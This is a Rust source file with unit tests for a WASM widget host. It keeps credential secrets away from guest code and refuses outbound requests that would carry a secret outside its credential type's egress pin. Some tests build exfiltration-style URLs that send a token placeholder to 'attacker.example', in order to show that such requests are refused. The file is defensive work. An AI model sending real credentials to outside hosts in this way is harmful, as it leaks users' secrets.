// Copyright (C) 2026  Braiins Forge s.r.o.
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <https://www.gnu.org/licenses/>.
//
// Braiins Systems s.r.o. and Braiins Forge s.r.o. each reserve the right
// to grant any party a license to this program, or any part thereof,
// under any terms, and such a grant shall be considered distinct from
// the grant above.

//! Guest imports for the credential view.
//!
//! Mirrors [`super::params`]: `host_credentials_version() -> u64`
//! as the change marker, and `host_credentials_snapshot(out_ptr, out_cap)`
//! as the probe-then-allocate reader.
//!
//! Only the view crosses this boundary.
//! The secret values sit beside it on [`crate::host_api::HostState`],
//! with no encoder and no import that reaches them,
//! so guest code has no path to a credential value.

use anyhow::Result;
use std::collections::BTreeMap;
use wasmi::{Caller, Extern, Linker};

use crate::host_api::HostState;

/// The account bound to one slot, as the guest is allowed to see it.
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct BoundCredential {
    pub type_id: String,
    pub account_name: String,
}

/// Slot → bound account for one widget instance. A slot absent from the map
/// is unbound, whether it was never bound or its account has disappeared.
///
/// Newtype for the same reason as [`super::params::ParamsSnapshot`]:
/// both the map and `WireEncode` are foreign,
/// so the impl needs a local type to hang on.
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct CredentialView(BTreeMap<String, BoundCredential>);

impl CredentialView {
    #[must_use]
    pub fn new(slots: BTreeMap<String, BoundCredential>) -> Self {
        Self(slots)
    }

    #[must_use]
    pub fn slot_count(&self) -> usize {
        self.0.len()
    }

    /// Credential type bound to a slot.
    /// This is the key the host looks the slot's egress policy up by.
    #[must_use]
    pub fn type_of(&self, slot: &str) -> Option<&str> {
        Some(self.0.get(slot)?.type_id.as_str())
    }
}

impl bmc_wasm_protocol::versioned_snapshot::WireEncode for CredentialView {
    fn encode(&self) -> Vec<u8> {
        encode_view(&self.0)
    }
}

/// Pack the view for the guest: a `u32` slot count,
/// then per slot its length-prefixed name, type id and account name.
///
/// `BTreeMap` order makes the buffer byte-identical for equal content,
/// which is what lets the guest read "bytes differ" as "resolution changed".
fn encode_view(slots: &BTreeMap<String, BoundCredential>) -> Vec<u8> {
    let mut out = Vec::new();
    let count = u32::try_from(slots.len()).unwrap_or(u32::MAX);
    out.extend_from_slice(&count.to_le_bytes());

    for (slot, bound) in slots.iter().take(count as usize) {
        push_str(&mut out, slot);
        push_str(&mut out, &bound.type_id);
        push_str(&mut out, &bound.account_name);
    }

    out
}

/// Length-prefixed UTF-8, truncated at a char boundary
/// so the guest's `from_utf8` cannot reject a field
/// for a mid-codepoint cut.
fn push_str(out: &mut Vec<u8>, s: &str) {
    let mut len = s.len().min(u16::MAX as usize);
    while len > 0 && !s.is_char_boundary(len) {
        len -= 1;
    }
    let len_u16 = u16::try_from(len).expect("BUG: len capped at u16::MAX");
    out.extend_from_slice(&len_u16.to_le_bytes());
    out.extend_from_slice(&s.as_bytes()[..len]);
}

/// Why a template could not be resolved.
/// Every variant names the offending text,
/// because the widget author is the one who has to fix it.
#[derive(Debug, PartialEq, Eq, thiserror::Error)]
pub enum SubstitutionError {
    #[error("no account is bound to credential slot {slot:?}")]
    UnboundSlot { slot: String },
    #[error("credential slot {slot:?} has no field {field:?}")]
    UnknownField { slot: String, field: String },
    #[error(
        "{name:?} is not a credential reference; only {{{{ credential.<slot>.<field> }}}} resolves"
    )]
    UnknownVariable { name: String },
    #[error("unterminated {{{{ … }}}} in the request")]
    Unterminated,
}

/// Replace every `{{ credential.<slot>.<field> }}` with the bound secret.
///
/// Deliberately not a template engine.
/// It substitutes declared credential variables and nothing else:
/// no blocks, no filters, no expressions,
/// because the template arrives from guest WASM and is hostile input.
///
/// Anything else between braces is an error rather than a silent
/// pass-through, so a typo fails loudly
/// instead of sending a half-built request.
///
/// `{{{{` escapes to a literal `{{`, as in Rust's own format strings.
pub fn substitute(
    template: &str,
    secrets: &bmc_widget_protocol::CredentialSecrets,
) -> Result<String, SubstitutionError> {
    let mut out = String::with_capacity(template.len());
    let mut rest = template;

    while let Some((before, after)) = rest.split_once("{{") {
        out.push_str(before);

        // `{{{{` is an escaped brace pair, not the start of a variable.
        if let Some(tail) = after.strip_prefix("{{") {
            out.push_str("{{");
            rest = tail;
            continue;
        }

        let Some((name, tail)) = after.split_once("}}") else {
            return Err(SubstitutionError::Unterminated);
        };
        out.push_str(resolve_variable(name.trim(), secrets)?);
        rest = tail;
    }
    out.push_str(rest);

    Ok(out)
}

/// Resolve one `credential.<slot>.<field>` reference.
fn resolve_variable<'a>(
    name: &str,
    secrets: &'a bmc_widget_protocol::CredentialSecrets,
) -> Result<&'a str, SubstitutionError> {
    let mut parts = name.split('.');
    let unknown = || SubstitutionError::UnknownVariable {
        name: name.to_owned(),
    };
    if parts.next() != Some("credential") {
        return Err(unknown());
    }
    let (Some(slot), Some(field), None) = (parts.next(), parts.next(), parts.next()) else {
        return Err(unknown());
    };

    // An unbound slot and a mistyped field are different mistakes:
    // the first is the operator's to fix, the second the widget author's.
    if !secrets.has_slot(slot) {
        return Err(SubstitutionError::UnboundSlot {
            slot: slot.to_owned(),
        });
    }
    secrets
        .field(slot, field)
        .ok_or_else(|| SubstitutionError::UnknownField {
            slot: slot.to_owned(),
            field: field.to_owned(),
        })
}

/// One outbound request with its placeholders already resolved.
pub(in crate::runtime) struct SpentRequest {
    pub url: String,
    pub headers: Vec<(String, String)>,
    pub body: Option<Vec<u8>>,
}

/// Substitute the widget's credential placeholders into one outbound request.
///
/// Returns `None` when the request must not go out:
/// a placeholder could not be resolved,
/// or the destination lies outside the egress pin
/// of a type whose secret the request spends.
///
/// Refusing beats sending a request with the placeholder still in it,
/// which would leak the *shape* of the call
/// to a host that was never meant to receive the secret.
///
/// A request naming no credential is returned untouched and unpinned:
/// the pin governs where a secret may travel,
/// not where a widget may fetch.
pub(in crate::runtime) fn spend(
    state: &HostState,
    url: &str,
    headers: &[(String, String)],
    body: Option<Vec<u8>>,
) -> Option<SpentRequest> {
    let secrets = &state.credential_secrets;
    let spent = slots_referenced(url, headers, body.as_deref());
    if spent.is_empty() {
        return Some(SpentRequest {
            url: url.to_owned(),
            headers: headers.to_vec(),
            body,
        });
    }

    // Parse before substituting, so the pin reads the destination
    // the guest wrote, not one a resolved secret could have reshaped.
    let Ok(destination) = url::Url::parse(url) else {
        tracing::warn!("refusing fetch: destination is not a parsable URL");
        return None;
    };
    if !egress_permitted(state, &destination, &spent) {
        return None;
    }

    let resolve = |text: &str| match substitute(text, secrets) {
        Ok(resolved) => Some(resolved),
        Err(err) => {
            tracing::warn!(%err, "refusing fetch: credential placeholder unresolved");
            None
        }
    };

    let url = resolve(url)?;
    let headers = headers
        .iter()
        .map(|(name, value)| Some((resolve(name)?, resolve(value)?)))
        .collect::<Option<Vec<_>>>()?;
    let body = match body {
        // A non-UTF-8 body cannot carry a textual placeholder,
        // so it passes through rather than failing the request.
        Some(bytes) => Some(match String::from_utf8(bytes) {
            Ok(text) => resolve(&text)?.into_bytes(),
            Err(raw) => raw.into_bytes(),
        }),
        None => None,
    };

    Some(SpentRequest { url, headers, body })
}

/// Credential slots the request refers to, by scanning for their placeholders.
///
/// Scanning the text rather than trusting a declaration
/// means a request is pinned only by the secrets it actually spends.
fn slots_referenced(url: &str, headers: &[(String, String)], body: Option<&[u8]>) -> Vec<String> {
    let mut slots: Vec<String> = Vec::new();
    // Same walk as `substitute`, so the two agree on what counts
    // as a reference, including that an escaped `{{{{` is not one.
    let mut scan = |text: &str| {
        let mut rest = text;
        while let Some((_, after)) = rest.split_once("{{") {
            if let Some(tail) = after.strip_prefix("{{") {
                rest = tail;
                continue;
            }
            let Some((name, tail)) = after.split_once("}}") else {
                break;
            };
            let mut parts = name.trim().split('.');
            if parts.next() == Some("credential")
                && let Some(slot) = parts.next()
                && !slots.iter().any(|s| s == slot)
            {
                slots.push(slot.to_owned());
            }
            rest = tail;
        }
    };

    scan(url);
    for (name, value) in headers {
        scan(name);
        scan(value);
    }
    if let Some(text) = body.and_then(|b| std::str::from_utf8(b).ok()) {
        scan(text);
    }

    slots
}

/// Whether every credential the request spends may travel to this destination.
///
/// A slot's policy comes from its credential type in the firmware catalog,
/// so the pin cannot be widened by anything the guest or the operator says.
fn egress_permitted(state: &HostState, url: &url::Url, spent: &[String]) -> bool {
    let Some((host, port)) = authority_of(url) else {
        tracing::warn!("refusing fetch: destination has no host to check against the egress pin");
        return false;
    };
    let view = state.credentials.snapshot();

    spent.iter().all(|slot| {
        let Some(type_id) = view.type_of(slot) else {
            // The view and the secrets travel as a pair,
            // but the widget process coalesces them separately,
            // so for one drain they can disagree.
            //
            // A secret whose type cannot be named has no known
            // destination, so it has none: refuse rather than assume.
            if state.credential_secrets.has_slot(slot) {
                tracing::warn!(
                    slot,
                    "refusing fetch: secret held for a slot of unknown type"
                );
                return false;
            }
            // Genuinely unbound, so substitution is about to fail anyway.
            // Letting it report names the slot instead of blaming the host.
            return true;
        };
        let policy = bmc_widget_manifest::credential::builtins()
            .into_iter()
            .find(|t| t.id == type_id)
            .and_then(|t| t.egress);
        let permitted = policy.is_none_or(|p| p.allows(&host, port));
        if !permitted {
            tracing::warn!(
                slot,
                type_id,
                host,
                "refusing fetch: destination is outside the credential type's egress pin"
            );
        }
        permitted
    })
}

/// Host and explicit port of a parsed URL.
///
/// A pin is worth something only if it sees the host the request dials,
/// so this reads the same parse the client will.
///
/// Goes through the typed [`url::Host`] rather than `host_str`,
/// which keeps the brackets around an IPv6 literal.
/// Rendering the address instead gives the bare form a CIDR entry parses,
/// and a domain arrives IDNA-encoded, so an internationalised name
/// is already punycode by the time a pin sees it.
fn authority_of(url: &url::Url) -> Option<(String, Option<u16>)> {
    let host = match url.host()? {
        url::Host::Domain(domain) => domain.to_owned(),
        url::Host::Ipv4(addr) => addr.to_string(),
        url::Host::Ipv6(addr) => addr.to_string(),
    };

    Some((host, url.port()))
}

pub(super) fn register(linker: &mut Linker<HostState>) -> Result<()> {
    register_credentials_version(linker)?;
    register_credentials_snapshot(linker)?;
    Ok(())
}

fn register_credentials_version(linker: &mut Linker<HostState>) -> Result<()> {
    linker.func_wrap(
        "env",
        "host_credentials_version",
        |caller: Caller<'_, HostState>| -> u64 { caller.data().credentials.version() },
    )?;
    Ok(())
}

fn register_credentials_snapshot(linker: &mut Linker<HostState>) -> Result<()> {
    linker.func_wrap(
        "env",
        "host_credentials_snapshot",
        |mut caller: Caller<'_, HostState>,
         out_ptr: u32,
         out_cap: u32|
         -> std::result::Result<u32, wasmi::Error> {
            let bytes = caller.data_mut().credentials.encoded().to_vec();
            let required = u32::try_from(bytes.len()).unwrap_or(u32::MAX);
            if out_cap == 0 || out_cap < required {
                return Ok(required);
            }

            let Some(Extern::Memory(memory)) = caller.get_export("memory") else {
                return Err(wasmi::Error::new(
                    "host_credentials_snapshot: guest exports no `memory`",
                ));
            };
            memory
                .write(&mut caller, out_ptr as usize, &bytes)
                .map_err(|_| {
                    wasmi::Error::new(
                        "host_credentials_snapshot: out_ptr + len exceeds guest memory",
                    )
                })?;

            Ok(required)
        },
    )?;
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;
    use bmc_wasm_protocol::versioned_snapshot::WireEncode;

    fn view_of(pairs: &[(&str, &str, &str)]) -> CredentialView {
        CredentialView::new(
            pairs
                .iter()
                .map(|(slot, type_id, account)| {
                    (
                        (*slot).to_owned(),
                        BoundCredential {
                            type_id: (*type_id).to_owned(),
                            account_name: (*account).to_owned(),
                        },
                    )
                })
                .collect(),
        )
    }

    /// A host holding one bound slot's secret, as `spend` sees it at egress.
    fn host_state_with(type_id: &str) -> HostState {
        let mut view = BTreeMap::new();
        view.insert(
            "pool".to_owned(),
            BoundCredential {
                type_id: type_id.to_owned(),
                account_name: "My pool".to_owned(),
            },
        );

        let mut state = HostState::new(
            crate::runtime_limits::RuntimeResourceLimits::default(),
            chrono::DateTime::parse_from_rfc3339("2026-01-01T00:00:00Z")
                .expect("BUG: fixed test timestamp must parse"),
        );
        state.credentials.replace(CredentialView::new(view));
        state.credential_secrets = pool_secrets();

        state
    }

    #[test]
    fn the_secret_reaches_the_request_the_network_thread_is_handed() {
        let state = host_state_with("braiins-pool");

        let spent = spend(
            &state,
            "https://api.braiins.com/?t={{ credential.pool.token }}",
            &[],
            None,
        )
        .expect("BUG: the pinned host is inside the policy");

        assert_eq!(spent.url, "https://api.braiins.com/?t=s3cr3t");
    }

    #[test]
    fn headers_and_body_are_substituted_too() {
        let state = host_state_with("braiins-pool");

        let spent = spend(
            &state,
            "https://api.braiins.com/",
            &[("X-Key".to_owned(), "{{ credential.pool.token }}".to_owned())],
            Some(b"tok={{ credential.pool.token }}".to_vec()),
        )
        .expect("BUG: the pinned host is inside the policy");

        assert_eq!(
            spent.headers,
            vec![("X-Key".to_owned(), "s3cr3t".to_owned())]
        );
        assert_eq!(spent.body.as_deref(), Some(&b"tok=s3cr3t"[..]));
    }

    #[test]
    fn a_destination_outside_the_pin_gets_no_request_at_all() {
        let state = host_state_with("braiins-pool");

        assert!(
            spend(
                &state,
                "https://attacker.example/?t={{ credential.pool.token }}",
                &[],
                None,
            )
            .is_none(),
            "refusing outright beats sending the placeholder to an unpinned host"
        );
    }

    #[test]
    fn an_unpinned_type_may_spend_its_secret_anywhere() {
        let state = host_state_with("generic-token");

        let spent = spend(
            &state,
            "https://anywhere.example/?t={{ credential.pool.token }}",
            &[],
            None,
        )
        .expect("BUG: a type without an egress policy is unrestricted");

        assert!(spent.url.ends_with("s3cr3t"));
    }

    #[test]
    fn a_secret_whose_slot_has_no_type_is_never_spent() {
        // Only a momentary disagreement between the two halves gets here,
        // and that is exactly when the pin must not be skipped.
        let mut state = host_state_with("braiins-pool");
        state.credentials.replace(CredentialView::default());

        assert!(
            spend(
                &state,
                "https://attacker.example/?t={{ credential.pool.token }}",
                &[],
                None,
            )
            .is_none(),
            "an unclassifiable secret has no known destination, so it has none"
        );
    }

    #[test]
    fn a_request_spending_nothing_is_neither_substituted_nor_pinned() {
        let state = host_state_with("braiins-pool");
        let plain = "https://attacker.example/harmless";

        let spent = spend(&state, plain, &[], None)
            .expect("BUG: the pin governs secrets, not where a widget may fetch");

        assert_eq!(spent.url, plain);
    }

    #[test]
    fn an_unresolvable_placeholder_stops_the_request() {
        let state = host_state_with("braiins-pool");

        assert!(
            spend(
                &state,
                "https://api.braiins.com/?t={{ credential.pool.tokne }}",
                &[],
                None,
            )
            .is_none(),
            "a typo must fail loudly, not send a half-built request"
        );
    }

    fn parsed_authority(url: &str) -> Option<(String, Option<u16>)> {
        authority_of(&url::Url::parse(url).expect("BUG: test url must parse"))
    }

    #[test]
    fn an_authority_is_split_from_scheme_path_and_userinfo() {
        for (url, expected) in [
            ("https://api.braiins.com/pool/v2", ("api.braiins.com", None)),
            (
                "https://api.braiins.com:8443/x",
                ("api.braiins.com", Some(8443)),
            ),
            ("http://10.1.2.3", ("10.1.2.3", None)),
            ("http://10.1.2.3:4028/api", ("10.1.2.3", Some(4028))),
            ("https://api.braiins.com?q=1", ("api.braiins.com", None)),
            (
                "https://user:pw@api.braiins.com/x",
                ("api.braiins.com", None),
            ),
        ] {
            let (host, port) = parsed_authority(url).expect("BUG: url has an authority");
            assert_eq!((host.as_str(), port), expected, "parsing {url}");
        }
    }

    #[test]
    fn an_ipv6_authority_loses_its_brackets_so_a_range_can_match_it() {
        assert_eq!(
            parsed_authority("http://[fd00::1]/api"),
            Some(("fd00::1".to_owned(), None))
        );
        assert_eq!(
            parsed_authority("http://[fd00::1]:4028/api"),
            Some(("fd00::1".to_owned(), Some(4028)))
        );
    }

    #[test]
    fn a_url_without_a_host_yields_no_authority() {
        assert_eq!(parsed_authority("data:text/plain,inline"), None);
    }

    #[test]
    fn an_internationalised_host_arrives_as_punycode() {
        let (host, _) = parsed_authority("https://böse.example/x").expect("BUG: has authority");

        assert!(
            host.is_ascii() && host.starts_with("xn--"),
            "a pin entry is compared against the encoded form the request dials, got {host}"
        );
    }

    #[test]
    fn only_referenced_slots_pin_the_request() {
        let slots = slots_referenced(
            "https://x/?t={{ credential.pool.token }}",
            &[(
                "X-Key".to_owned(),
                "{{ credential.weather.token }}".to_owned(),
            )],
            Some(b"{{ credential.pool.token }}"),
        );

        assert_eq!(slots, vec!["pool".to_owned(), "weather".to_owned()]);
    }

    #[test]
    fn a_request_naming_no_credential_references_no_slot() {
        assert!(slots_referenced("https://x/plain", &[], None).is_empty());
    }

    #[test]
    fn an_escaped_brace_does_not_reference_a_slot() {
        assert!(
            slots_referenced("{{{{ credential.pool.token }}", &[], None).is_empty(),
            "the scanner and the resolver must agree on what an escape is"
        );
    }

    fn pool_secrets() -> bmc_widget_protocol::CredentialSecrets {
        let mut slots = serde_json::Map::new();
        slots.insert(
            "pool".to_owned(),
            serde_json::json!({ "token": "s3cr3t", "username": "miner" }),
        );

        bmc_widget_protocol::CredentialSecrets::new(slots)
    }

    #[test]
    fn a_reference_is_replaced_by_its_value() {
        let resolved = substitute(
            "https://api.braiins.com/?t={{ credential.pool.token }}",
            &pool_secrets(),
        );

        assert_eq!(resolved.as_deref(), Ok("https://api.braiins.com/?t=s3cr3t"));
    }

    #[test]
    fn several_references_resolve_independently() {
        let resolved = substitute(
            "{{ credential.pool.username }}:{{ credential.pool.token }}",
            &pool_secrets(),
        );

        assert_eq!(resolved.as_deref(), Ok("miner:s3cr3t"));
    }

    #[test]
    fn a_template_without_references_is_returned_unchanged() {
        let plain = "https://api.braiins.com/pool/v2";

        assert_eq!(substitute(plain, &pool_secrets()).as_deref(), Ok(plain));
    }

    #[test]
    fn doubled_braces_escape_to_a_literal_pair() {
        let resolved = substitute("{{{{ credential.pool.token }}", &pool_secrets());

        assert_eq!(
            resolved.as_deref(),
            Ok("{{ credential.pool.token }}"),
            "an escaped brace must not resolve the text that follows it"
        );
    }

    #[test]
    fn a_value_containing_braces_is_not_resolved_again() {
        let mut slots = serde_json::Map::new();
        slots.insert(
            "pool".to_owned(),
            serde_json::json!({ "token": "{{ credential.pool.token }}" }),
        );
        let secrets = bmc_widget_protocol::CredentialSecrets::new(slots);

        assert_eq!(
            substitute("{{ credential.pool.token }}", &secrets).as_deref(),
            Ok("{{ credential.pool.token }}"),
            "substitution is single-pass; a value is never rescanned"
        );
    }

    #[test]
    fn an_unbound_slot_is_named_in_the_error() {
        let err = substitute("{{ credential.weather.token }}", &pool_secrets());

        assert_eq!(
            err,
            Err(SubstitutionError::UnboundSlot {
                slot: "weather".to_owned()
            })
        );
    }

    #[test]
    fn a_mistyped_field_is_a_different_error_from_an_unbound_slot() {
        let err = substitute("{{ credential.pool.tokne }}", &pool_secrets());

        assert_eq!(
            err,
            Err(SubstitutionError::UnknownField {
                slot: "pool".to_owned(),
                field: "tokne".to_owned()
            })
        );
    }

    #[test]
    fn anything_but_a_credential_reference_is_refused() {
        for name in ["env.HOME", "credential.pool", "credential.pool.token.extra"] {
            let template = format!("{{{{ {name} }}}}");
            assert_eq!(
                substitute(&template, &pool_secrets()),
                Err(SubstitutionError::UnknownVariable {
                    name: name.to_owned()
                }),
                "only declared credential variables resolve"
            );
        }
    }

    #[test]
    fn an_unterminated_reference_is_refused() {
        let err = substitute("https://x/?t={{ credential.pool.token", &pool_secrets());

        assert_eq!(err, Err(SubstitutionError::Unterminated));
    }

    /// The claim the whole feature rests on: a host holding live secrets
    /// encodes a guest view containing none of them.
    ///
    /// `HostState` keeps the two halves in separate fields
    /// and gives only the view an encoder, so this is structural.
    /// The test pins it against someone later giving the secrets one.
    #[test]
    fn the_encoded_view_cannot_carry_a_secret() {
        let view = view_of(&[("pool", "braiins-pool", "My pool")]);
        let mut secrets = serde_json::Map::new();
        secrets.insert(
            "pool".to_owned(),
            serde_json::json!({ "token": "s3cr3t-do-not-leak" }),
        );
        let secrets = bmc_widget_protocol::CredentialSecrets::new(secrets);

        // The pair exactly as `HostState` holds it: the view behind the cache
        // the guest imports read, the secrets in a plain field with no encoder.
        let mut guest_channel =
            bmc_wasm_protocol::versioned_snapshot::VersionedSnapshotCache::new(view);

        let as_text = String::from_utf8_lossy(guest_channel.encoded()).into_owned();
        assert!(
            !as_text.contains("s3cr3t-do-not-leak") && !as_text.contains("token"),
            "neither the value nor the field name may appear in the guest's bytes: {as_text}"
        );
        assert!(
            as_text.contains("My pool"),
            "…while the account name the guest may see still arrives"
        );
        assert!(
            secrets.to_json_string().contains("s3cr3t-do-not-leak"),
            "the secret must genuinely be present on the half that stays host-side"
        );
    }

    #[test]
    fn an_unbound_widget_encodes_to_a_bare_zero_count() {
        assert_eq!(CredentialView::default().encode(), 0_u32.to_le_bytes());
    }

    #[test]
    fn encoding_is_byte_identical_for_equal_content() {
        let a = view_of(&[
            ("pool", "braiins-pool", "Mine"),
            ("api", "generic-token", "T"),
        ]);
        let b = view_of(&[
            ("api", "generic-token", "T"),
            ("pool", "braiins-pool", "Mine"),
        ]);

        assert_eq!(a.encode(), b.encode());
    }

    /// Inverse of [`encode_view`], so the tests exercise the format the SDK parses
    /// rather than asserting against a byte literal nobody can read.
    fn decode(bytes: &[u8]) -> Vec<(String, String, String)> {
        let mut at = 4;
        let count = u32::from_le_bytes(bytes[0..4].try_into().expect("BUG: 4-byte header"));
        let mut take = || {
            let len = u16::from_le_bytes(
                bytes[at..at + 2]
                    .try_into()
                    .expect("BUG: 2-byte length prefix"),
            ) as usize;
            at += 2;
            let s =
                String::from_utf8(bytes[at..at + len].to_vec()).expect("BUG: encoder wrote utf8");
            at += len;
            s
        };

        (0..count).map(|_| (take(), take(), take())).collect()
    }

    #[test]
    fn a_multibyte_account_name_survives_the_round_trip() {
        let encoded = view_of(&[("pool", "braiins-pool", "Můj účet")]).encode();

        assert_eq!(
            decode(&encoded),
            vec![(
                "pool".to_owned(),
                "braiins-pool".to_owned(),
                "Můj účet".to_owned()
            )]
        );
    }

    #[test]
    fn every_bound_slot_reaches_the_guest() {
        let encoded = view_of(&[
            ("pool", "braiins-pool", "Mine"),
            ("api", "generic-token", "T"),
        ])
        .encode();

        let decoded = decode(&encoded);
        assert_eq!(
            decoded
                .iter()
                .map(|(slot, ..)| slot.as_str())
                .collect::<Vec<_>>(),
            vec!["api", "pool"],
            "slots are emitted in map order so equal content encodes identically"
        );
    }
}
